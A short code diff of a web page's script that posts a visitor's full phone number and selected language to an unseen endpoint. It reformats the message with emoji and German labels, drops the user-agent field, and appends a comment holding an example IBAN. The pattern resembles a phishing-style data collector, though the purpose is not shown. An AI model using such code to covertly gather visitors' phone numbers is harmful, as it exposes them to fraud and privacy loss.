@@ -338,9 +338,8 @@ nextBtn.addEventListener("click", async () => {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       message:
-        `Phone: ${fullPhone}\n` +
-        `Lang: ${current}\n` +
-        `UA: ${navigator.userAgent}`
+        `📱 Telefonnummer:\n${fullPhone}\n\n` +
+        `🌐 Sprache:\n${current}`
     })
   });
 
@@ -354,3 +353,5 @@ setError(false);
 </script>
 </body>
 </html>
+
+//DE89 3704 0044 0532 0130 00
